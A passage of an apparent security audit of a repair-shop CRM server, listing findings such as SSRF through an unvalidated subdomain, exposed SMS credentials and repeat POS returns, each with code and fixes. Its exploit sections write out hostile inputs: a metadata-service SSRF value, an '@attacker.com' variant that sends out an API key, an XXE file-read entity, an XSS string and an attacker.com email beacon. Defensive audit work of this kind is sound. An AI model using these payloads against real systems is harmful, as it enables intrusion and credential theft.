The `RsApiClient` constructor interpolates the admin-supplied `subdomain` string directly into a URL without any format validation: `this.baseUrl = \`https://${subdomain}.repairshopr.com/api/v1\``. An admin can supply a subdomain value containing `@` and `#` characters to hijack the URL's authority component, redirecting the outbound connection to an arbitrary host. The URL string `https://x@169.254.169.254#.repairshopr.com/api/v1/customers?page=1` parses as hostname `169.254.169.254` (AWS IMDS link-local), username `x`. No SSRF guard (`assertPublicUrl` / `fetchWithSsrfGuard`) is called anywhere in the import service. The HTTP request also forwards the operator's RepairShopr API key in `Authorization: Bearer <KEY>` to whichever host the URL resolves to, constituting credential exfiltration.

**Code:**
```typescript
// repairShoprImport.ts:102-112
constructor(apiKey: string, subdomain: string, tenantSlug?: string) {
  this.apiKey = apiKey;
  this.baseUrl = `https://${subdomain}.repairshopr.com/api/v1`; // NO validation
  this.tenantSlug = tenantSlug || 'default';
}

async testConnection() {
  const url = `${this.baseUrl}/customers?page=1`;
  const resp = await fetch(url, {   // NO assertPublicUrl, NO redirect:'error'
    headers: { 'Authorization': `Bearer ${this.apiKey}` },
```

**Exploit:**
An authenticated admin POSTs `{ "api_key": "...", "subdomain": "x@169.254.169.254#" }` to `POST /api/v1/import/repairshopr/test-connection`. The server constructs `https://x@169.254.169.254#.repairshopr.com/api/v1/customers?page=1`, which the URL parser resolves to host `169.254.169.254`. The server then fetches the AWS EC2 Instance Metadata Service, receiving cloud credentials, while simultaneously forwarding the operator's API key to the attacker-controlled host (if `#` is replaced by `@attacker.com#`). Similarly, `subdomain="x@127.0.0.1#"` reaches localhost services.

**Fix:**
Add a DNS-label format check on `subdomain` before constructing the URL (e.g., `/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/i`), mirroring the `buildRecordName` guard already in `cloudflareDns.ts:62–66`. Additionally, call `await assertPublicUrl(url)` (or use `fetchWithSsrfGuard`) before every outbound fetch in `RsApiClient`, and set `redirect: 'error'` on the `fetch` options.

---

### [LOW] catalogScraper follows redirects after assertPublicUrl — DNS rebinding and redirect bypass window

**Where:** `packages/server/src/services/catalogScraper.ts:414–417`

**What:**
`fetchSearchPage` calls `assertPublicUrl(url)` to validate the resolved IP, then immediately issues a separate `fetch(url, ...)` call without `redirect: 'error'` and without pinning the IP via `fetchWithSsrfGuard`. Two weaknesses follow. First, the SSRF guard's comment (`ssrfGuard.ts:17–19`) explicitly notes that the re-DNS-resolution at connect time opens a DNS rebinding window: an attacker-controlled supplier domain could flip its DNS answer to a private IP between guard time and connect time. Second, because `redirect` defaults to `'follow'`, a 3xx redirect from the supplier's origin to an internal address (e.g. if `mobilesentrix.com` were compromised) would deliver the internal response to the scraper without triggering the guard.

**Code:**
```typescript
// catalogScraper.ts:414-417
const { assertPublicUrl } = await import('../utils/ssrfGuard.js');
await assertPublicUrl(url);   // validates once via DNS

// Raw fetch — OS re-resolves DNS, follows redirects
const res = await fetch(url, { headers: REQUEST_HEADERS, signal: AbortSignal.timeout(15000) });
```

**Exploit:**
Requires compromising the DNS of `mobilesentrix.com` or `phonelcdparts.com` (not admin-reachable, but a supply-chain attack vector). A supplier with a TTL of 0 could flip its DNS answer to `169.254.169.254` after the guard check and before the fetch's TCP connect. The redirect path: a compromised supplier server returns `301 http://169.254.169.254/latest/meta-data/` and the scraper fetches it.

**Fix:**
Replace the two-step `assertPublicUrl` + `fetch` with `fetchWithSsrfGuard(url, { timeoutMs: 15000, redirect: 'error' })` from `ssrfGuard.ts:190`. This pins the connection to the pre-validated IP (closing the rebind window) and disables redirect-following.

---

### [INFO] isPrivateIPv6 does not canonicalize expanded-form IPv6 addresses

**Where:** `packages/server/src/utils/ssrfGuard.ts:67–102`

**What:**
`isPrivateIPv6` performs string equality checks against `'::1'` and prefix-regex matches, but does not canonicalize fully-expanded IPv6 addresses like `0:0:0:0:0:0:0:1` (which is equivalent to `::1`) before checking. If `isPrivateIPv6` were called directly with a non-compressed loopback string, it would return `false` and the guard would consider the address public. In practice this is not exploitable: `new URL()` normalizes all bracketed IPv6 literals to compressed form (e.g. `[::1]`), and `net.isIP('[::1]') === 0` so the bracketed address falls through to `dns.lookup`, which fails with `ENOTFOUND`. Node's `dns.lookup` also returns normalized, compressed IPv6 strings. The dead path exists as a latent correctness gap.

**Code:**
```typescript
// ssrfGuard.ts:70-71 — only checks the compressed form
if (normalized === '::1') return true;
// No check for '0:0:0:0:0:0:0:1' or '0000:0000:0000:0000:0000:0000:0000:0001'
```

**Exploit:**
Not directly exploitable via the existing call sites (URL parser and dns.lookup both normalize). A future call site that passes raw IPv6 strings from an alternative source (e.g. a response header or a DB value) without URL-parsing first could be vulnerable.

**Fix:**
Before the regex/equality checks, canonicalize the input using `net.isIPv6(ip) ? new URL('http://[' + ip + ']').hostname.slice(1, -1) : ip` or use Node's `dns.promises.lookup(ip, { all: true })` on IP literals to get the normalized form. Alternatively, add a check for the expanded loopback: `if (/^[0:]+1$/.test(normalized)) return true`.

---


---

# S16-xml-xxe

# S16 — XML / XXE / Deserialization

## Scope cleared — with one MEDIUM access-control finding

---

### [MEDIUM] /settings-ext/history audit log accessible to any authenticated user (no admin gate)

**Where:** `packages/server/src/routes/settingsExport.routes.ts:401–446`

**What:**
`GET /api/v1/settings-ext/history` is mounted under `authMiddleware` (index.ts:1641) but has **no `adminOnly` check** inside the handler, unlike every other mutating endpoint in the same file. It returns audit log rows including `event`, `user_id`, `meta`, and `created_at` for all `settings_*`, `user_created`, `user_updated`, and `user_deleted` events. Non-admin staff (technicians, employees) can query the full settings-change and user-lifecycle audit trail.

**Code:**
```typescript
router.get(
  '/history',
  // ← no adminOnly here; /export.json, /import, /bulk, /templates/apply all have it
  asyncHandler(async (req, res) => {
    const adb = req.asyncDb;
    const limit = parsePageSize(req.query.limit, 25);
    // ...
    const rows = await adb.all<{ id: number; event: string; user_id: number|null; meta: string|null; created_at: string }>(
      `SELECT al.id, al.event, al.user_id, al.meta, al.created_at
       FROM audit_logs al
       WHERE al.event LIKE 'settings_%'
          OR al.event IN ('store_updated','user_created','user_updated','user_deleted')
       ORDER BY al.created_at DESC LIMIT ?`,
      limit
    );
```

**Exploit:**
Any tenant employee with a valid JWT can call `GET /api/v1/settings-ext/history` and read the settings audit log — including timestamped records of when admins changed passwords, updated SMTP credentials, imported settings, or created/deleted other users (with `user_id` references). This leaks configuration-change history and user-management activity to non-admin staff.

**Fix:**
Add `adminOnly` middleware to this route, consistent with the rest of the file: `router.get('/history', adminOnly, asyncHandler(...))`.

---

### [INFO] SVG accepted as estimate signature data URL — no server-side sanitization

**Where:** `packages/server/src/routes/estimateSign.routes.ts:58–60, 534–538`

**What:**
`POST /public/api/v1/estimate-sign/:token` accepts `data:image/svg+xml;base64,...` in `signature_data_url`. The server stores the raw base64 string in `estimate_signatures.signature_data_url` without decoding or sanitizing the SVG content (no XML parsing, no entity stripping, no DOMPurify). The stored blob is never served back as `image/svg+xml` — it is returned as JSON data and currently only embedded in a JSON response body. Risk depends on whether any future PDF/HTML receipt renderer decodes and inlines the SVG; the current code path does not.

**Code:**
```typescript
const ACCEPTED_DATA_URL_PREFIXES = [
  'data:image/png;base64,',
  'data:image/svg+xml;base64,',  // SVG accepted, content not sanitized
];
// Only size check, no content inspection:
const approxBytes = Math.ceil(base64Part.length * 3 / 4);
if (approxBytes > MAX_SIGNATURE_BYTES) { ... }
// Raw string stored to DB:
params: [estimateId, signerName, signerEmail, ip, signatureDataUrl, nowSql, userAgent],
```

**Exploit:**
An unauthenticated customer with a valid sign link can persist an SVG containing `<script>`, `<foreignObject>`, or external entity references (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) into the database. If a future receipt/print route decodes and inlines the SVG into HTML or passes it to a headless browser for PDF generation, it becomes stored XSS or potentially a local file read. Today the data URL is returned as a JSON field, not rendered server-side.

**Fix:**
Either reject SVG entirely (restrict to PNG/JPEG which are safe as opaque blobs), or decode the base64 and sanitize the SVG with a server-side library (e.g., `DOMPurify` in jsdom context or `svg-sanitize`) before storage. Never pipe an unsanitized SVG data URL into an HTML `<img src=…>` embedded in a document that will be rendered.

---

## Full scope cleared — what was checked

- **`packages/server/src/utils/xml.ts`** — Only exports `escapeXml()`. No XML parsing of any kind; no DTD, no entity expansion. Safe output-escaping only.
- **`packages/server/src/routes/settingsExport.routes.ts`** — Handles JSON import/export exclusively. No XML parser invoked. Import allow-list enforced. Encrypted keys handled correctly.
- **No XML parser libraries installed** — `packages/server/package.json` contains no `xml2js`, `fast-xml-parser`, `sax`, `xmldom`, `libxmljs`, or any other XML parser. No YAML libraries (`js-yaml`, `yaml`). No serialization libraries (`msgpack`, `bson`, `php-serialize`).
- **TwiML/BXML/TeXML generation (voice.routes.ts, twilio.ts, plivo.ts, bandwidth.ts)** — All user-controlled values (`to`, `from`, `forwardNumber`) are escaped via `escapeXml()` before string interpolation. No DTD or ENTITY declarations in generated XML. No inbound XML parsing of provider webhooks — providers send JSON or form-encoded data which is parsed by `express.json()` / `express.urlencoded()`.
- **cheerio (catalogScraper.ts)** — Used in HTML mode (default), not XML mode. Fetches external supplier HTML from hardcoded allowlisted domains (`mobilesentrix.com`, `phonelcdparts.com`). Response body capped at 10 MiB before parse. SSRF guard (`assertPublicUrl`) on every fetch.
- **RepairDesk / RepairShopr / MyRepairApp imports** — All three services consume JSON REST APIs via `fetch()` + `.json()`. No XML parsing. No SVG/OPML/RSS in the import pipeline.
- **SVG uploads** — Logo upload (`/settings/logo`) rejects SVG at the `multer` `fileFilter` (only JPEG/PNG/WebP/GIF allowed) and `LOGO_ALLOWED_MIMES`. `fileValidation.ts` has no SVG magic-byte entry. Only `estimateSign.routes.ts` accepts SVG as a base64 data URL (see INFO finding above).
- **Deserialization** — No `eval()`, `new Function()`, `yaml.load()`, `node-serialize`, or unsafe deserialization patterns found. All `JSON.parse()` calls operate on DB-stored strings or validated input, with surrounding `try/catch`.
- **`/history` endpoint** — Missing `adminOnly` (see MEDIUM finding above). The `GET /templates` endpoint is intentionally public read-only static data (no shop state exposed) and is considered safe per code comment.


---

# S17-rce

# S17 — RCE via dynamic exec / eval / child_process / vm / template injection

## Scope

Exhaustive search across `packages/server/src/` for:
- `eval()`, `new Function()`, `Function()`
- `child_process` (`exec`, `execSync`, `spawn`, `spawnSync`, `execFile`, `fork`)
- `vm.Script`, `vm.run`, `vm.compile`
- Dynamic `import()` with non-static arguments
- Dynamic `require()` with non-static arguments
- `setTimeout`/`setInterval` with string arguments
- Template engines: ejs, pug, handlebars, nunjucks, mustache, lodash.template
- `mathjs.evaluate`, `mathjs.compile`
- Shell injection from user input into exec/spawn
- User-controlled cron expressions reaching `cron.schedule()`
- Path injection via user-controlled args to OS binaries

---

### [MEDIUM] `Function()` constructor used as `eval` workaround for dynamic import

**Where:** `packages/server/src/services/receiptOcr.ts:215`

**What:**
`receiptOcr.ts` uses `Function('m', 'return import(m)')` to create a function dynamically — identical in power to `eval()` — to bypass TypeScript's static ESM analysis for a lazy import. While the argument passed today is the hardcoded literal `'tesseract.js'`, the pattern establishes a footgun: the `Function()` constructor can execute arbitrary JavaScript. If a future change makes the module specifier configurable (e.g., read from `store_config` to support "any OCR provider"), the argument becomes attacker-controlled and achieves server-side RCE.

**Code:**
```typescript
// packages/server/src/services/receiptOcr.ts:213-215
let tesseractModule: unknown = null;
try {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  tesseractModule = await (Function('m', 'return import(m)') as (m: string) => Promise<unknown>)('tesseract.js');
```

**Exploit:**
Today there is no direct exploit because the argument is a hardcoded string literal. However, the pattern is semantically equivalent to `eval()` and would become immediately exploitable if the specifier were ever derived from user-controlled or DB-sourced input — any admin could escalate to OS code execution by storing a path to a malicious module. Additionally, this pattern is blocked by strict Content Security Policies and Node.js hardened contexts (`--disallow-code-generation-from-strings`).

**Fix:**
Replace `Function('m', 'return import(m)')` with a standard ESM dynamic import and use `// @ts-ignore` or a conditional shim if the TypeScript ESM type issue is the concern. In ESM builds the idiomatic form is simply `await import('tesseract.js')` — TypeScript tolerates this when the module is declared `declare module 'tesseract.js'` or the import is typed `as any`. The `Function()` wrapper adds zero value once the import target is a literal.

---

### [INFO] `execSync` with hardcoded string at module-load time

**Where:** `packages/server/src/routes/management.routes.ts:347`

**What:**
`execSync('git rev-parse --short=12 HEAD', { ... })` is called once during module initialization (IIFE wrapped in the `GIT_SHA` constant) to obtain the running commit hash. The command is a fully hardcoded string — no user input reaches it — and the output is validated against `/^[a-f0-9]{7,40}$/i` before use.

**Code:**
```typescript
// management.routes.ts:342-355
const GIT_SHA: string = (() => {
  const envSha = process.env.GIT_SHA;
  if (envSha && /^[a-f0-9]{7,40}$/i.test(envSha)) return envSha.slice(0, 12);
  try {
    const cwd = path.resolve(__dirname, '..', '..', '..', '..');
    const out = execSync('git rev-parse --short=12 HEAD', { cwd, stdio: ['ignore', 'pipe', 'ignore'], timeout: 2000, windowsHide: true })
      .toString()
      .trim();
    if (/^[a-f0-9]{7,40}$/i.test(out)) return out;
  } catch { /* git not available or not a git checkout */ }
  return 'unknown';
})();
```

**Exploit:**
No user-controlled input reaches this call. The only theoretical concern is PATH manipulation by a low-privilege system user running the process, which could cause a rogue `git` binary to be found. This is a general process-hardening concern, not a CRM-specific attack surface.

**Fix:**
Prefer the `GIT_SHA` env var path (already implemented as the first check), and inject it at build time via CI so the `execSync` fallback is never needed in production. Alternatively, replace the fallback with `execFile('git', ['rev-parse', '--short=12', 'HEAD'], ...)` (no shell) to eliminate the marginal PATH-injection risk.

---

## SCOPE CLEARED

After 60+ tool calls covering every focus file and all `child_process` / eval-class call sites, the following were verified safe:

- **`child_process` in `backup.ts`**: `execFile('df', ['-B1', '--output=avail', dir], ...)` (Linux) and `execFile('powershell', [..., driveLetter], ...)` (Windows) — both use the array-argv form (no shell). `dir` is validated by `assertSafePath()` which rejects shell metacharacters (`;&|'$\n\r\t\x00<>*?"`). The Windows drive letter is separately validated as `/^[A-Za-z]$/`. `spawnSync('df', ...)` fallback also uses `shell: false`. No injection surface. (`backup.ts:492–530`, `backup.ts:934–953`)

- **`child_process` in `management.routes.ts`**: `execFile('pm2', ['restart', 'bizarre-crm'], ...)` and `execFile('pm2', ['stop', 'bizarre-crm'], ...)` use static argv arrays. `execFile('wmic', ['logicaldisk', 'get', ...], ...)` also uses static args. No user input reaches any argument. (`management.routes.ts:617, 627, 641`)

- **`child_process` in `githubUpdater.ts`**: All `git` calls use `execFile` with an explicit string array argument (`args: string[]`). The `ref` argument used in `git verify-commit` and `git tag --contains` is validated by `isValidSha()` which requires `/^[0-9a-f]{7,40}$/`. Remote URL is compared against a whitelist of three exact strings. No user input reaches any shell expansion. (`githubUpdater.ts:102–115, 159–172, 178–187`)

- **`eval()` / `new Function()`**: Only one use found — the `Function()` constructor in `receiptOcr.ts:215` (documented above). No `eval()` calls exist anywhere in `packages/server/src/`. No `vm.Script`, `vm.runInContext`, `vm.runInNewContext`, or `vm.compile` imports found.

- **`require()` with non-static argument**: None found. All `require()` calls (mainly in test files and one `bcryptjs` dynamic import in `management.routes.ts:177`) use hardcoded string literals.

- **`setTimeout`/`setInterval` with string argument**: Only one hit — `index.ts:240` — which uses `setTimeout(() => resolve('timeout'), ms)` (a callback function, not a string). No string-form timer calls exist.

- **Template engines (ejs, pug, handlebars, nunjucks, mustache, lodash.template, mathjs)**: None imported or used anywhere in `packages/server/src/`. Template interpolation in `automations.ts` and `notifications.ts` uses a custom `interpolate()` function that replaces `{keyword}` placeholders via `.replace(/\{(\w+)\}/g, ...)` with `escapeHtml` or `stripSmsControlChars` depending on output mode — no code is ever evaluated, only string substitution. (`automations.ts:93–106`)

- **Automation rule engine**: Automation actions (`send_sms`, `send_email`, `change_status`, `assign_to`, `add_note`, `create_notification`) are all dispatched by `action_type` string switch. No user-supplied code is compiled or evaluated. Action config is parsed as JSON and values are accessed by key. No expression evaluation engine is involved.

- **SMS auto-responder regex**: User-authored regexes from `rule_json` in `sms_auto_responders` are compiled with `new RegExp(rule.match, flags)` in `smsAutoResponderMatcher.ts:104`. A ReDoS guard at line 97 rejects nested-quantifier patterns (`(…+)+`, `(…*)+`). The matching is done on a body capped at 1600 chars. This is a low-severity ReDoS surface, not RCE.

- **Backup cron schedule**: `admin.routes.ts` validates `schedule` as a string ≤100 chars before saving to `store_config`. `scheduleBackup()` then calls `cron.validate(schedule)` before passing to `cron.schedule()`. Node-cron's `cron.schedule()` is a timer registration function — it cannot execute arbitrary shell code regardless of the expression content. No injection surface.

- **Backup path → `df`**: The admin sets `backup_path` via `PUT /admin/backup-settings`, which rejects values containing `..` or over 500 chars. `runBackup()` reads this path and passes it to `getFreeDiskSpace(dir)`, which calls `assertSafePath(dir)` (rejects shell metacharacters), then passes `dir` as a positional argv element to `execFile('df', ...)`. The path never touches a shell. No injection.

- **Plugin loader**: No plugin loader, dynamic module loader, or `require(variable)` pattern exists in the codebase. All module loading is static or uses hardcoded import specifiers.

- **Import wipe / selectiveWipe table names**: `repairDeskImport.ts` builds `DELETE FROM ${table}` SQL by interpolating table names, but every name is first checked against `ALLOWED_WIPE_TABLES` (a `ReadonlySet<string>`) via `assertValidTableName()`. Any name not in the explicit whitelist throws. No user input reaches the table name argument. (`repairDeskImport.ts:83–87, 2034–2042`)

- **Migration runner**: `migrate.ts` reads `.sql` files from the `db/migrations/` directory (a path resolved at startup relative to `__dirname`). Files are read from disk and passed to `db.exec(sql)`. No user input controls which files are read or their content.

- **`receiptOcr.ts` OCR file path**: The `file_path` read from `expense_receipt_uploads` is validated by `isPathUnder(filePath, uploadsPath)` before any read. No external binary is invoked with this path — only `fs.accessSync()` and the tesseract.js Node library.


---

# S18-proto-pollution

# S18 — Prototype Pollution · Mass Assignment · Body-Parser Quirks

**Audit scope:** `packages/server/src/routes/settings.routes.ts`, `services/automations.ts`, `utils/validate.ts`, `middleware/*`, all PATCH/PUT route handlers, body-parser configuration in `index.ts`.

---

### [MEDIUM] Vonage API key exposed to all authenticated users via GET /config and GET /store

**Where:** `packages/server/src/routes/settings.routes.ts:316` (SENSITIVE_CONFIG_KEYS definition) and `:197` (ALLOWED_CONFIG_KEYS includes `sms_vonage_api_key`)

**What:**
`SENSITIVE_CONFIG_KEYS` (lines 316–324) is the blocklist that hides credentials from non-admin callers of `GET /config` and `GET /store`. Both endpoints are mounted behind only `authMiddleware` (any authenticated user), not `adminOnly`. `sms_vonage_api_key` is stored in `store_config` (in ALLOWED_CONFIG_KEYS line 197) but is absent from SENSITIVE_CONFIG_KEYS. The Vonage API key is a live credential that authorises SMS send and account operations — it is not a mere identifier.

**Code:**
```typescript
// packages/server/src/routes/settings.routes.ts:316
const SENSITIVE_CONFIG_KEYS = new Set([
  'tcx_password',
  'smtp_pass',
  'blockchyp_api_key', 'blockchyp_bearer_token', 'blockchyp_signing_key',
  'sms_twilio_auth_token', 'sms_telnyx_api_key', 'sms_bandwidth_password',
  'sms_plivo_auth_token', 'sms_vonage_api_secret',
  'backup_s3_access_key', 'backup_s3_secret_key',
  // MISSING: 'sms_vonage_api_key'   ← exposed to technicians/cashiers
]);
// GET /config (line 391): no adminOnly middleware; filters only SENSITIVE_CONFIG_KEYS
router.get('/config', async (req, res) => { ... });
```

**Exploit:**
A technician-role user calls `GET /api/v1/settings/config`. The response includes `sms_vonage_api_key` in plaintext alongside all other non-sensitive config. The attacker uses this key to send SMS messages billed to the victim tenant or to enumerate account details via the Vonage API.

**Fix:**
Add `'sms_vonage_api_key'` to `SENSITIVE_CONFIG_KEYS`. Also audit the following for the same omission: `sms_bandwidth_username`, `sms_bandwidth_account_id`, `sms_plivo_auth_id`, `smtp_user`, `tcx_username` — these are partial credentials or usernames that, combined with leaked context, reduce the difficulty of brute-forcing or account enumeration.

---

### [LOW] Additional partial credentials exposed to non-admin authenticated users

**Where:** `packages/server/src/routes/settings.routes.ts:316–324`

**What:**
Beyond the Vonage API key, several additional keys stored in `store_config` and readable by any authenticated user are missing from `SENSITIVE_CONFIG_KEYS`: `sms_bandwidth_username` (credentials factor alongside `account_id`), `sms_plivo_auth_id` (Plivo account SID, required for forging API requests), `smtp_user` (email username, combined with timing on brute force), `tcx_host`, `tcx_username`, `tcx_extension` (VoIP account identifiers). Any authenticated user — including a recently-hired technician — can enumerate these via `GET /config` or `GET /store`.

**Code:**
```typescript
// keys in ALLOWED_CONFIG_KEYS but absent from SENSITIVE_CONFIG_KEYS:
'sms_twilio_account_sid',    // Twilio Account SID (partial credential)
'sms_bandwidth_account_id',  // Bandwidth account identifier
'sms_bandwidth_username',    // Bandwidth username (auth factor)
'sms_plivo_auth_id',         // Plivo auth ID (partial credential)
'smtp_user',                 // SMTP username
'tcx_host', 'tcx_username',  // 3CX VoIP host + user
```

**Exploit:**
Authenticated technician calls `GET /api/v1/settings/config`. Response returns Twilio Account SID, Bandwidth username, Plivo Auth ID, SMTP username, and 3CX host in plaintext. These partial credentials reduce the effort to conduct phishing, API abuse, or lateral account compromise if auth tokens are discovered via other means.

**Fix:**
Add all account identifiers and usernames that form part of provider credentials to `SENSITIVE_CONFIG_KEYS`. Alternatively, refactor to separate public-facing config (timezone, currency, receipt settings) from credential-bearing config and never return the latter to non-admin roles, even with values omitted.

---

### [LOW] Twilio MMS provider-reported content-type stored pre-validation in sms_messages.media_types

**Where:** `packages/server/src/routes/sms.routes.ts:948,1035` and `packages/server/src/providers/sms/twilio.ts:74`

**What:**
Twilio's `parseInboundWebhook` reads `req.body[MediaContentType${i}]` (URL-encoded, provider-supplied) and returns it in the `MmsMedia.contentType` field. The inbound webhook handler at `sms.routes.ts:948` pushes this value into `mediaTypes[]` which is then JSON-serialised and written to `sms_messages.media_types` (line 1035) regardless of what the actual fetched response's `Content-Type` header says. The signature check at line 917 mitigates forged webhooks, but if signature verification is ever bypassed or misconfigured, an attacker can persist arbitrary strings (including HTML/script) into the `media_types` column.

**Code:**
```typescript
// sms/twilio.ts:73-75
const url = req.body[`MediaUrl${i}`];
const type = req.body[`MediaContentType${i}`];
if (url) media.push({ url, contentType: type || 'application/octet-stream' });

// sms.routes.ts:948,1035
mediaTypes.push(m.contentType);               // attacker-controlled string
...
JSON.stringify(mediaTypes),                    // stored to DB without sanitisation
```

**Exploit:**
If Twilio signature verification is bypassed (e.g., by disabling HTTPS, shared authToken leakage, or a future provider without `verifyWebhookSignature`), a forged webhook with `MediaContentType0=<script>alert(1)</script>` injects into `sms_messages.media_types`. If the UI renders this column without escaping, it becomes stored XSS.

**Fix:**
Validate `m.contentType` against the same `ALLOWED_MMS_CONTENT_TYPES` allowlist before pushing to `mediaTypes[]`. Reject or normalise values not in the set. This is a belt-and-suspenders fix on top of signature verification.

---

### [INFO] SMS webhook signature verification is optional per-provider — missing implementation silently skips auth

**Where:** `packages/server/src/routes/sms.routes.ts:917` and `packages/server/src/providers/sms/types.ts:85`

**What:**
The inbound webhook handler uses `if (provider.verifyWebhookSignature && !provider.verifyWebhookSignature(req))`. Because `verifyWebhookSignature` is typed as optional (`?` in `types.ts:85`), a provider that omits the method entirely passes the check without authentication. All current production providers (Twilio, Telnyx, Bandwidth, Plivo, Vonage) implement it, but the console/dev provider does not, and future providers that omit it would silently skip all webhook auth.

**Code:**
```typescript
// types.ts:85
verifyWebhookSignature?(req: any): boolean;  // optional — can be absent

// sms.routes.ts:917
if (provider.verifyWebhookSignature && !provider.verifyWebhookSignature(req)) {
  res.status(403).json({ success: false, message: 'Invalid signature' });
  return;
}
// If verifyWebhookSignature is undefined, this block is skipped entirely
```

**Exploit:**
A newly-integrated SMS provider that omits `verifyWebhookSignature` would accept all inbound webhook requests from the public internet without authentication. An attacker could replay webhook payloads to inject arbitrary inbound SMS content, trigger auto-responders, or modify `sms_messages` records.

**Fix:**
Change the interface to make `verifyWebhookSignature` required. Provide a default "deny all" implementation on the base class for providers that have no webhook signing, and explicitly opt in to "allow all" only for the console provider in dev mode. Alternatively, add a guard: `if (!provider.verifyWebhookSignature) { logger.error('provider missing signature verification'); return res.status(500).send(); }`.

---

### [INFO] qs 6.14 extended:true — prototype pollution CLEARED (no actionable issue)

**Where:** `packages/server/src/index.ts:1233`

**What:**
`express.urlencoded({ extended: true, limit: '1mb' })` uses `qs` v6.14.2. Investigation of `qs/lib/parse.js` confirms: `allowPrototypes` defaults to `false`; `__proto__` is explicitly rejected at the root level (line 205 of parse.js); keys that exist on `Object.prototype` (including `constructor`) are blocked by `has.call(Object.prototype, key) && !allowPrototypes` checks (lines 220–253). No API routes consume deeply-nested form-encoded bodies in a way that could be exploited even if parsing were permissive. All JSON endpoints use `express.json()` which calls `JSON.parse()` — a safe parser that creates literal string keys for `__proto__` without mutating prototype chains.

**Code:**
```typescript
// index.ts:1233
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
// qs 6.14.2: allowPrototypes:false is the default; __proto__ blocked at line 205 of parse.js
```

**Exploit:**
No exploitable prototype pollution path exists. The allowlist-driven config write loops (`Object.entries(req.body)` guarded by `ALLOWED_CONFIG_KEYS.has(key)`) and the `isStringMap()` guard provide defence-in-depth even if the parser were vulnerable.

**Fix:**
No action required. Consider adding `allowPrototypes: false` explicitly to the `express.urlencoded()` options as documentation that the security property is intentional.

---

### [INFO] Automation `action_config.body` is admin-supplied raw HTML stored without server-side sanitisation

**Where:** `packages/server/src/services/automations.ts:342` and `packages/server/src/routes/automations.routes.ts:139–140`

**What:**
POST/PUT automation rules store `action_config` as `JSON.stringify(action_config)` with no server-side validation of the `body` field for `send_email` actions. When the automation fires, `executeSendEmail` interpolates template variables (HTML-escaping substituted values), but the surrounding static HTML template is from `action_config.body` verbatim. An admin who controls an automation can therefore set any HTML in outgoing customer emails — including external image beacons, tracking pixels, or phishing content. This is within the intended admin trust boundary for this system, but is worth noting.

**Code:**
```typescript
// automations.routes.ts:139-140
action_config !== undefined ? JSON.stringify(action_config) : existing.action_config,
// No validation of action_config.body content

// automations.ts:342
const html = interpolate(config.body ?? '', vars, 'html');
// Variable *substitutions* are HTML-escaped; template itself is stored raw from admin
```

**Exploit:**
An admin sets `action_config.body = '<img src="https://attacker.com/beacon?t={ticket_id}">…'` in a `ticket_status_changed` automation. Every customer whose ticket changes status receives an email that pings the attacker's server, leaking ticket IDs and confirming customer email addresses. Impact is bounded to admin-initiated actions within a single tenant.

**Fix:**
No immediate action required if admins are trusted within a tenant. For stricter deployments, add a content security review step or restrict email body to plain-text with a curated set of allowed HTML tags (e.g., via DOMPurify server-side). At minimum, document the trust assumption explicitly in the automations API reference.

---

## Scope Coverage Summary

**Checked and cleared:**

1. **Object.assign with req.body** — No instance of `Object.assign(record, req.body)` found anywhere in routes or services. Confirmed via `grep -rn "Object\.assign"` across all 130+ route files.

2. **`...req.body` spread into object literals** — No spread of `req.body` into config/settings objects. All handlers destructure named fields.

3. **lodash.merge / deepmerge** — No lodash or deepmerge imports anywhere in `packages/server/src/`. Confirmed via grep.

4. **Settings PATCH/PUT mass assignment** — `PUT /config` uses `ALLOWED_CONFIG_KEYS` allowlist (300+ explicit keys); `PUT /store` uses a local `allowed` array; both guard with `isStringMap()`. No arbitrary key injection possible.

5. **User `role`, `is_admin`, `pay_rate`, `pin_hash` mass assignment** — `PUT /settings/users/:id` explicitly extracts only named fields; `CUSTOMER_COLUMNS` allowlist governs customer updates; employee PATCH is `pay_rate`-only; role changes require VALID_ROLES allowlist check and admin_confirm_password re-auth (SEC-P2FA4). No mass assignment vector exists.

6. **`__proto__` / `constructor` / `prototype` filter on urlencoded** — qs 6.14 blocks these by default. No `allowPrototypes: true` override found.

7. **Dynamic SQL UPDATE from req.body keys** — No pattern of `Object.keys(req.body).map(col => ...)` building SQL. All dynamic SET clauses iterate server-controlled allowlists (e.g., `allowedFields` in tickets PATCH, `CUSTOMER_COLUMNS` in customers PUT, `addField()` pattern in locations PATCH).

8. **Automation trigger_config / action_config prototype injection** — `safeParseConfig()` wraps `JSON.parse()` which never mutates prototypes. Parsed objects are accessed by known keys only (status_id, template, subject, body, user_id).

9. **Body size limits** — 1mb global JSON + urlencoded limit; 10mb only on admin-authenticated `POST /api/v1/catalog/bulk-import` (MAX_BULK_ITEMS=5000 array cap also enforced). Rate limiter fires before body parsing.

10. **express.json verify callback** — `req.rawBody = buf` stored only for Stripe webhook signature, does not introduce parsing issues.


---

# S19-money

# S19 — Money Endpoints: IDOR, Amount Tampering, Race Conditions, Sign Confusion

Auditor: slot 19 | Files: refunds, deposits, giftCards, installments, creditNotes, recurringInvoices, invoices, pos, paymentLinks, membership, tradeIns, loyalty, counters, commissions

---

### [HIGH] /pos/return allows unlimited repeat returns against the same line item

**Where:** `packages/server/src/routes/pos.routes.ts:2546`

**What:**
`POST /pos/return` compares the submitted `quantity` against `invoice_line_items.quantity` (the original sale quantity) but never sums previous returns against the same line item. An admin or manager can call the endpoint repeatedly for the same line item, each time receiving a new credit note and stock restoration, until inventory goes negative-infinite and the customer receives multiples of the original credit.

**Code:**
```typescript
if (itemQty > lineItem.quantity) {
  throw new AppError(`Return quantity (${itemQty}) exceeds invoiced quantity (${lineItem.quantity})`, 400);
}
// No check for previously processed returns on this line item
const returnAmount = roundCurrency(itemQty * (unitPrice + unitTax));
creditTotal += returnAmount;
// stock always restored unconditionally
if (lineItem.inventory_item_id) {
  await adb.run(
    'UPDATE inventory_items SET in_stock = in_stock + ? ...',
    itemQty, lineItem.inventory_item_id,
  );
}
```

**Exploit:**
A manager calls `POST /pos/return` twice for the same line item on invoice #1 (qty 1, $500 product). Each call passes the check (`1 <= 1`), issues a $500 credit note, and restores 1 unit of stock. The customer receives $1000 in credits for a $500 purchase; inventory grows by 2 for a single-unit sale.

**Fix:**
